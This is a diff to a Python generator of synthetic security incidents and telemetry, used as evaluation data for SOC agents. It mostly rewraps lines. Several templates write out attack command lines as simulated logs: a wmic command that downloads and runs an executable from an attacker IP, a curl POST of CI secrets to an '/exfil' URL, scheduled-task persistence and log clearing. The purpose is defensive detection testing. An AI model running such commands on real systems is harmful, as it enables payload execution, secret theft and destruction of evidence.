@@ -53,6 +53,7 @@ Design notes
   signInLogs, etc.) — exact enough to write detections against, generic
   enough that we don't pretend to be a full data generator.
 """
+
 from __future__ import annotations
 
 import argparse
@@ -68,29 +69,68 @@ from typing import Any
 # ---------------------------------------------------------------------------
 
 HOSTNAMES = [
-    "WIN-FIN-DB01", "WIN-PROD-WEB02", "WIN-HR-DESKTOP", "WIN-DEVOPS-LT",
-    "LIN-K8S-NODE01", "LIN-BUILD-CI03", "LIN-EDGE-VPN02", "MAC-CFO-LAPTOP",
-    "MAC-LEGAL-LAPTOP", "WIN-DC-PRIMARY", "WIN-DC-SECONDARY", "WIN-EXCHANGE-01",
-    "LIN-OBS-LOGGER", "LIN-DB-REPLICA", "WIN-FILE-SHARE", "K8S-PROD-CLUSTER",
-    "AWS-EC2-PROD-API", "AZURE-VM-FIN-001", "GCP-GKE-NODE-04",
+    "WIN-FIN-DB01",
+    "WIN-PROD-WEB02",
+    "WIN-HR-DESKTOP",
+    "WIN-DEVOPS-LT",
+    "LIN-K8S-NODE01",
+    "LIN-BUILD-CI03",
+    "LIN-EDGE-VPN02",
+    "MAC-CFO-LAPTOP",
+    "MAC-LEGAL-LAPTOP",
+    "WIN-DC-PRIMARY",
+    "WIN-DC-SECONDARY",
+    "WIN-EXCHANGE-01",
+    "LIN-OBS-LOGGER",
+    "LIN-DB-REPLICA",
+    "WIN-FILE-SHARE",
+    "K8S-PROD-CLUSTER",
+    "AWS-EC2-PROD-API",
+    "AZURE-VM-FIN-001",
+    "GCP-GKE-NODE-04",
 ]
 
 USERS = [
-    "alice@example.com", "bob@example.com", "carol@example.com", "dave@example.com",
-    "eve@example.com", "frank@example.com", "grace@example.com", "heidi@example.com",
-    "svc-deploy@example.com", "svc-backup@example.com", "admin@example.com",
-    "cfo@example.com", "ceo@example.com", "ops-lead@example.com",
+    "alice@example.com",
+    "bob@example.com",
+    "carol@example.com",
+    "dave@example.com",
+    "eve@example.com",
+    "frank@example.com",
+    "grace@example.com",
+    "heidi@example.com",
+    "svc-deploy@example.com",
+    "svc-backup@example.com",
+    "admin@example.com",
+    "cfo@example.com",
+    "ceo@example.com",
+    "ops-lead@example.com",
 ]
 
 ATTACKER_IPS = [
-    "192.168.1.100", "10.0.99.42", "172.16.50.7", "203.0.113.45",
-    "198.51.100.23", "185.220.101.7", "45.142.122.111", "91.134.231.15",
+    "192.168.1.100",
+    "10.0.99.42",
+    "172.16.50.7",
+    "203.0.113.45",
+    "198.51.100.23",
+    "185.220.101.7",
+    "45.142.122.111",
+    "91.134.231.15",
 ]
 
 CAMPAIGNS = [
-    "LockBit 3.0", "ALPHV/BlackCat", "APT28", "APT29", "Emotet epoch 5",
-    "Lazarus", "FIN7", "MagicWeb", "MosaicRegressor", "Volt Typhoon",
-    "Scattered Spider", "Cobalt Strike",
+    "LockBit 3.0",
+    "ALPHV/BlackCat",
+    "APT28",
+    "APT29",
+    "Emotet epoch 5",
+    "Lazarus",
+    "FIN7",
+    "MagicWeb",
+    "MosaicRegressor",
+    "Volt Typhoon",
+    "Scattered Spider",
+    "Cobalt Strike",
 ]
 
 # ---------------------------------------------------------------------------
@@ -518,8 +558,7 @@ TEMPLATES: list[Template] = [
         template_id="certutil-download-cradle",
         title="Living-off-the-land: certutil download cradle on {host}",
         description=(
-            "certutil.exe -urlcache invoked from cmd.exe on {host}. cmd.exe was spawned by "
-            "outlook.exe. Payload downloaded from {ip}."
+            "certutil.exe -urlcache invoked from cmd.exe on {host}. cmd.exe was spawned by " "outlook.exe. Payload downloaded from {ip}."
         ),
         tactics=("TA0002", "TA0005"),
         techniques=("T1105", "T1218.009"),
@@ -549,8 +588,7 @@ TEMPLATES: list[Template] = [
         template_id="docker-runtime-abuse",
         title="Container runtime abuse: malicious `docker run` on {host}",
         description=(
-            "Unauthenticated Docker API on {host} exploited from {ip}. Container with cryptominer "
-            "spawned. CPU on host saturated to 95%."
+            "Unauthenticated Docker API on {host} exploited from {ip}. Container with cryptominer " "spawned. CPU on host saturated to 95%."
         ),
         tactics=("TA0002", "TA0001", "TA0040"),
         techniques=("T1610", "T1059.004", "T1496"),
@@ -668,7 +706,7 @@ TEMPLATES: list[Template] = [
                 Computer="{host}",
                 Image="C:\\Windows\\System32\\schtasks.exe",
                 ParentImage="C:\\Windows\\System32\\cmd.exe",
-                CommandLine="schtasks /Create /SC MINUTE /MO 30 /TN UpdaterTask /TR \"powershell -f %APPDATA%\\Roaming\\u.ps1\" /F",
+                CommandLine='schtasks /Create /SC MINUTE /MO 30 /TN UpdaterTask /TR "powershell -f %APPDATA%\\Roaming\\u.ps1" /F',
                 User="{user}",
             ),
         ),
@@ -677,8 +715,7 @@ TEMPLATES: list[Template] = [
         template_id="uefi-firmware-implant",
         title="Firmware implant detected on UEFI partition of {host}",
         description=(
-            "UEFI secure-boot violation on {host}. Unknown module detected in firmware. Signature "
-            "matches MosaicRegressor implant."
+            "UEFI secure-boot violation on {host}. Unknown module detected in firmware. Signature " "matches MosaicRegressor implant."
         ),
         tactics=("TA0003", "TA0005"),
         techniques=("T1542.001", "T1027.002"),
@@ -704,10 +741,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="cron-backdoor",
         title="Backdoor cron job installed on {host}",
-        description=(
-            "/etc/cron.d entry created by {user} on {host}. Reverse shell beacon to {ip} every 5 "
-            "minutes."
-        ),
+        description=("/etc/cron.d entry created by {user} on {host}. Reverse shell beacon to {ip} every 5 " "minutes."),
         tactics=("TA0003", "TA0011"),
         techniques=("T1053.003", "T1071.001"),
         severity="high",
@@ -737,8 +771,7 @@ TEMPLATES: list[Template] = [
         template_id="uac-bypass-fodhelper",
         title="UAC bypass observed on {host}",
         description=(
-            "fodhelper.exe abuse on {host} by {user}; auto-elevation triggered without prompt. "
-            "Process tree shows escalation to SYSTEM."
+            "fodhelper.exe abuse on {host} by {user}; auto-elevation triggered without prompt. " "Process tree shows escalation to SYSTEM."
         ),
         tactics=("TA0004", "TA0005"),
         techniques=("T1548.002",),
@@ -769,8 +802,7 @@ TEMPLATES: list[Template] = [
         template_id="k8s-privileged-pod-escape",
         title="Container escape via privileged pod on {host}",
         description=(
-            "Kubernetes privileged pod created on {host} by {user}. cgroup escape to host "
-            "namespace observed. Node filesystem accessed."
+            "Kubernetes privileged pod created on {host} by {user}. cgroup escape to host " "namespace observed. Node filesystem accessed."
         ),
         tactics=("TA0004", "TA0007"),
         techniques=("T1611", "T1082"),
@@ -785,9 +817,7 @@ TEMPLATES: list[Template] = [
                 user={"username": "{user}"},
                 requestObject={
                     "spec": {
-                        "containers": [
-                            {"name": "x", "image": "alpine", "securityContext": {"privileged": True}}
-                        ],
+                        "containers": [{"name": "x", "image": "alpine", "securityContext": {"privileged": True}}],
                         "hostPID": True,
                     }
                 },
@@ -808,8 +838,7 @@ TEMPLATES: list[Template] = [
         template_id="linux-suid-abuse",
         title="Linux SUID binary abuse on {host}",
         description=(
-            "Custom SUID binary discovered in /tmp on {host}; allows arbitrary command execution "
-            "as root. Likely escalation by {user}."
+            "Custom SUID binary discovered in /tmp on {host}; allows arbitrary command execution " "as root. Likely escalation by {user}."
         ),
         tactics=("TA0004",),
         techniques=("T1548.001",),
@@ -880,10 +909,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="event-log-cleared",
         title="Indicator removal: Windows event log cleared on {host}",
-        description=(
-            "Security event log cleared on {host} by {user}. wevtutil.exe cl Security observed in "
-            "command-line telemetry."
-        ),
+        description=("Security event log cleared on {host} by {user}. wevtutil.exe cl Security observed in " "command-line telemetry."),
         tactics=("TA0005",),
         techniques=("T1070.001",),
         severity="high",
@@ -910,10 +936,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="disable-edr-tooling",
         title="Disable security tooling on {host}",
-        description=(
-            "{user} attempted to stop Defender, CrowdStrike, and Sysmon on {host}. Tampering "
-            "telemetry triggered alert."
-        ),
+        description=("{user} attempted to stop Defender, CrowdStrike, and Sysmon on {host}. Tampering " "telemetry triggered alert."),
         tactics=("TA0005",),
         techniques=("T1562.001",),
         severity="critical",
@@ -945,8 +968,7 @@ TEMPLATES: list[Template] = [
         template_id="lsass-memory-dump",
         title="LSASS memory dump on {host} by {user}",
         description=(
-            "comsvcs.dll MiniDump observed on {host}. lsass.exe memory dumped to "
-            "C:\\Windows\\Temp\\. Mimikatz signatures detected."
+            "comsvcs.dll MiniDump observed on {host}. lsass.exe memory dumped to " "C:\\Windows\\Temp\\. Mimikatz signatures detected."
         ),
         tactics=("TA0006",),
         techniques=("T1003.001",),
@@ -1040,10 +1062,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="ad-dcsync",
         title="Active Directory DCSync from non-DC host {host}",
-        description=(
-            "Replication rights abused from {host} by {user}. All domain NTLM hashes replicated. "
-            "Severe credential exposure."
-        ),
+        description=("Replication rights abused from {host} by {user}. All domain NTLM hashes replicated. " "Severe credential exposure."),
         tactics=("TA0006", "TA0004"),
         techniques=("T1003.006", "T1078.002"),
         severity="critical",
@@ -1065,10 +1084,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="saml-golden-ticket",
         title="SAML golden-ticket: forged assertion targeting {user}",
-        description=(
-            "Forged SAML assertion detected for {user}. Attacker pivoted to Azure AD; account "
-            "enumeration followed from {ip}."
-        ),
+        description=("Forged SAML assertion detected for {user}. Attacker pivoted to Azure AD; account " "enumeration followed from {ip}."),
         tactics=("TA0006", "TA0007"),
         techniques=("T1606.002", "T1087.002"),
         severity="critical",
@@ -1098,10 +1114,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="ldap-bloodhound-discovery",
         title="Domain enumeration from {host}",
-        description=(
-            "ldap discovery from {host} by {user}: BloodHound-style queries enumerating users, "
-            "groups, ACLs."
-        ),
+        description=("ldap discovery from {host} by {user}: BloodHound-style queries enumerating users, " "groups, ACLs."),
         tactics=("TA0007",),
         techniques=("T1087.002",),
         severity="medium",
@@ -1131,8 +1144,7 @@ TEMPLATES: list[Template] = [
         template_id="smb-share-enumeration",
         title="Network share enumeration on {host}",
         description=(
-            "Mass SMB share enumeration from {host} by {user}; net.exe and PowerShell Get-SmbShare "
-            "invocations across /24 subnet."
+            "Mass SMB share enumeration from {host} by {user}; net.exe and PowerShell Get-SmbShare " "invocations across /24 subnet."
         ),
         tactics=("TA0007",),
         techniques=("T1135",),
@@ -1237,7 +1249,7 @@ TEMPLATES: list[Template] = [
                 Computer="{host}",
                 User="{user}",
                 Image="C:\\Windows\\System32\\wbem\\wmic.exe",
-                CommandLine="wmic /node:{target_host} process call create \"cmd /c curl http://{ip}/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe\"",
+                CommandLine='wmic /node:{target_host} process call create "cmd /c curl http://{ip}/p.exe -o C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe"',
             ),
         ),
     ),
@@ -1248,8 +1260,7 @@ TEMPLATES: list[Template] = [
         template_id="bulk-pii-download",
         title="Bulk PII download by {user}",
         description=(
-            "{user} downloaded >10 GB of customer records from production database from {host}. "
-            "Outside normal access pattern."
+            "{user} downloaded >10 GB of customer records from production database from {host}. " "Outside normal access pattern."
         ),
         tactics=("TA0009", "TA0010"),
         techniques=("T1005", "T1041"),
@@ -1353,10 +1364,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="personal-drive-exfil",
         title="Personal Drive exfil by {user}",
-        description=(
-            "{user} on {host} uploaded 4 GB to personal Google Drive. Files include source code "
-            "and customer PII."
-        ),
+        description=("{user} on {host} uploaded 4 GB to personal Google Drive. Files include source code " "and customer PII."),
         tactics=("TA0009", "TA0010"),
         techniques=("T1567.002", "T1005"),
         severity="critical",
@@ -1381,10 +1389,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="dga-c2",
         title="DGA-based C2 traffic from {host}",
-        description=(
-            "DGA traffic from {host} observed; 200+ NXDomain replies/min, IoCs match {campaign} "
-            "epoch 5. Beacons to {ip}."
-        ),
+        description=("DGA traffic from {host} observed; 200+ NXDomain replies/min, IoCs match {campaign} " "epoch 5. Beacons to {ip}."),
         tactics=("TA0011",),
         techniques=("T1568.002",),
         severity="high",
@@ -1414,8 +1419,7 @@ TEMPLATES: list[Template] = [
         template_id="https-c2-beacon",
         title="HTTPS C2 beacon from {host} to {ip}",
         description=(
-            "Periodic HTTPS beacon from {host} to {ip} every 60 seconds with low jitter. JA3 "
-            "fingerprint matches Cobalt Strike."
+            "Periodic HTTPS beacon from {host} to {ip} every 60 seconds with low jitter. JA3 " "fingerprint matches Cobalt Strike."
         ),
         tactics=("TA0011",),
         techniques=("T1071.001",),
@@ -1479,10 +1483,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="xmrig-cryptominer",
         title="Cryptominer execution on {host}",
-        description=(
-            "XMRig miner spawned on {host}; CPU saturated to 95%. Mining pool {ip}:5555. Linked "
-            "to {campaign}."
-        ),
+        description=("XMRig miner spawned on {host}; CPU saturated to 95%. Mining pool {ip}:5555. Linked " "to {campaign}."),
         tactics=("TA0002", "TA0040"),
         techniques=("T1496",),
         severity="medium",
@@ -1533,10 +1534,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="public-s3-bucket-pii",
         title="Public S3 bucket exposing PII",
-        description=(
-            "S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external "
-            "enumeration from {ip}."
-        ),
+        description=("S3 bucket world-readable; ~40k employee records accessible. CloudTrail shows external " "enumeration from {ip}."),
         tactics=("TA0009", "TA0010"),
         techniques=("T1530", "T1567.002"),
         severity="critical",
@@ -1548,7 +1546,10 @@ TEMPLATES: list[Template] = [
                 "PutBucketAcl",
                 event_source="s3.amazonaws.com",
                 userIdentity={"type": "IAMUser", "userName": "ops-lead@example.com"},
-                requestParameters={"bucketName": "aisoc-employees", "AccessControlPolicy": {"Grants": [{"Grantee": "AllUsers", "Permission": "READ"}]}},
+                requestParameters={
+                    "bucketName": "aisoc-employees",
+                    "AccessControlPolicy": {"Grants": [{"Grantee": "AllUsers", "Permission": "READ"}]},
+                },
             ),
             _cloudtrail(
                 "ListObjectsV2",
@@ -1588,8 +1589,7 @@ TEMPLATES: list[Template] = [
         template_id="ddos-syn-flood",
         title="DDoS volumetric flood targeting public-facing {host}",
         description=(
-            "L4 SYN flood from a botnet (>1M PPS) targeting {host}. Edge mitigation engaged but "
-            "service degraded for 12 minutes."
+            "L4 SYN flood from a botnet (>1M PPS) targeting {host}. Edge mitigation engaged but " "service degraded for 12 minutes."
         ),
         tactics=("TA0040",),
         techniques=("T1498.001",),
@@ -1612,10 +1612,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="insider-mailbox-export",
         title="Insider preparing departure: large mailbox export by {user}",
-        description=(
-            "{user} exported full mailbox PST (8 GB) from {host}. HR flag: notice given last "
-            "week."
-        ),
+        description=("{user} exported full mailbox PST (8 GB) from {host}. HR flag: notice given last " "week."),
         tactics=("TA0009", "TA0010"),
         techniques=("T1114.002", "T1567.002"),
         severity="high",
@@ -1635,10 +1632,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="office-vsto-addin",
         title="Malicious Office add-in installed for {user}",
-        description=(
-            "Office VSTO add-in registered under HKCU for {user} on {host}; loads on every Outlook "
-            "startup; beacons to {ip}."
-        ),
+        description=("Office VSTO add-in registered under HKCU for {user} on {host}; loads on every Outlook " "startup; beacons to {ip}."),
         tactics=("TA0003", "TA0011"),
         techniques=("T1137.006", "T1071.001"),
         severity="high",
@@ -1699,8 +1693,7 @@ TEMPLATES: list[Template] = [
         template_id="ec2-imds-credential-theft",
         title="EC2 instance metadata service abused on {host}",
         description=(
-            "IMDSv1 abused on {host}; temporary IAM credentials for role exfilled to {ip}. "
-            "CloudTrail shows AssumeRole from external."
+            "IMDSv1 abused on {host}; temporary IAM credentials for role exfilled to {ip}. " "CloudTrail shows AssumeRole from external."
         ),
         tactics=("TA0006", "TA0004"),
         techniques=("T1552.005", "T1078.004"),
@@ -1720,7 +1713,11 @@ TEMPLATES: list[Template] = [
                 "AssumeRole",
                 event_source="sts.amazonaws.com",
                 sourceIPAddress="{ip}",
-                userIdentity={"type": "AssumedRole", "principalId": "AIDA:role-app", "arn": "arn:aws:sts::123456789012:assumed-role/role-app/i-0abc"},
+                userIdentity={
+                    "type": "AssumedRole",
+                    "principalId": "AIDA:role-app",
+                    "arn": "arn:aws:sts::123456789012:assumed-role/role-app/i-0abc",
+                },
                 userAgent="aws-cli/2.13",
             ),
         ),
@@ -1757,10 +1754,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="oauth-refresh-token-theft",
         title="OAuth refresh-token theft for {user}",
-        description=(
-            "Refresh token for {user} replayed from {ip}. Granted access to mailbox + "
-            "OneDrive without re-prompt."
-        ),
+        description=("Refresh token for {user} replayed from {ip}. Granted access to mailbox + " "OneDrive without re-prompt."),
         tactics=("TA0006",),
         techniques=("T1550.001",),
         severity="high",
@@ -1782,8 +1776,7 @@ TEMPLATES: list[Template] = [
         template_id="malicious-container-image",
         title="Container image with embedded backdoor pulled by {host}",
         description=(
-            "Image registry/repo:malicious-backdoor pulled by {host}. Layer scan flagged "
-            "embedded netcat reverse-shell binary."
+            "Image registry/repo:malicious-backdoor pulled by {host}. Layer scan flagged " "embedded netcat reverse-shell binary."
         ),
         tactics=("TA0001", "TA0002"),
         techniques=("T1195.002", "T1610"),
@@ -1810,10 +1803,7 @@ TEMPLATES: list[Template] = [
     Template(
         template_id="outlook-auto-forward-rule",
         title="Outlook rule auto-forwarding mail from {user}",
-        description=(
-            "Outlook inbox rule created for {user} that forwards all mail to external address at "
-            "{ip}. Linked to {campaign}."
-        ),
+        description=("Outlook inbox rule created for {user} that forwards all mail to external address at " "{ip}. Linked to {campaign}."),
         tactics=("TA0006", "TA0009"),
         techniques=("T1564.008", "T1114.003"),
         severity="high",
@@ -1839,8 +1829,7 @@ TEMPLATES: list[Template] = [
         template_id="linux-journald-tampering",
         title="Linux journald log tampering on {host}",
         description=(
-            "journalctl --rotate --vacuum-time=1s observed on {host} by {user}; recent journal "
-            "entries purged. Indicator removal."
+            "journalctl --rotate --vacuum-time=1s observed on {host} by {user}; recent journal " "entries purged. Indicator removal."
         ),
         tactics=("TA0005",),
         techniques=("T1070.002",),
@@ -1864,8 +1853,7 @@ TEMPLATES: list[Template] = [
         template_id="compromised-ci-runner",
         title="Compromised CI runner on {host} pushing to production",
         description=(
-            "Self-hosted CI runner {host} compromised. Job triggered from PR injected secret "
-            "exfil step; secrets posted to {ip}."
+            "Self-hosted CI runner {host} compromised. Job triggered from PR injected secret " "exfil step; secrets posted to {ip}."
         ),
         tactics=("TA0001", "TA0006", "TA0010"),
         techniques=("T1195.002", "T1552.004"),
@@ -1885,7 +1873,8 @@ TEMPLATES: list[Template] = [
             _auditd(
                 "execve",
                 exe="/usr/bin/curl",
-                a1="-X", a2="POST",
+                a1="-X",
+                a2="POST",
                 a3="https://{ip}/exfil",
                 hostname="{host}",
                 user="ci-runner",
@@ -1897,8 +1886,7 @@ TEMPLATES: list[Template] = [
         template_id="vpn-new-geography",
         title="Suspicious VPN login from new geography for {user}",
         description=(
-            "VPN login for {user} from {ip} (new country, no prior history). Subsequent "
-            "lateral SMB scan from VPN range to {host}."
+            "VPN login for {user} from {ip} (new country, no prior history). Subsequent " "lateral SMB scan from VPN range to {host}."
         ),
         tactics=("TA0001", "TA0008"),
         techniques=("T1078.004", "T1021.002"),
@@ -1928,8 +1916,7 @@ TEMPLATES: list[Template] = [
         template_id="service-account-privileged-command",
         title="Privileged command run as service account on {host}",
         description=(
-            "Service account {user} (no interactive use expected) ran privileged net.exe + "
-            "wevtutil cl Security on {host}. Anomalous."
+            "Service account {user} (no interactive use expected) ran privileged net.exe + " "wevtutil cl Security on {host}. Anomalous."
         ),
         tactics=("TA0005", "TA0006"),
         techniques=("T1078.001", "T1070.001"),
@@ -1954,6 +1941,7 @@ TEMPLATES: list[Template] = [
 # ---------------------------------------------------------------------------
 # Deterministic generation
 # ---------------------------------------------------------------------------
+
 
 def _seed_index(index: int, salt: str) -> int:
     """Stable per-(index, salt) integer derived from SHA256."""
@@ -2128,23 +2116,13 @@ def main() -> int:
     parser.add_argument(
         "--out",
         type=Path,
-        default=Path(__file__).parent.parent
-        / "services"
-        / "agents"
-        / "tests"
-        / "eval_data"
-        / "synthetic_incidents.json",
+        default=Path(__file__).parent.parent / "services" / "agents" / "tests" / "eval_data" / "synthetic_incidents.json",
         help="Output JSON path",
     )
     parser.add_argument(
         "--telemetry-out",
         type=Path,
-        default=Path(__file__).parent.parent
-        / "services"
-        / "agents"
-        / "tests"
-        / "eval_data"
-        / "synthetic_telemetry.jsonl",
+        default=Path(__file__).parent.parent / "services" / "agents" / "tests" / "eval_data" / "synthetic_telemetry.jsonl",
         help="Output JSONL path for the synthetic telemetry stream (one event per line)",
     )
     parser.add_argument("--coverage", action="store_true", help="Print coverage report after generating")
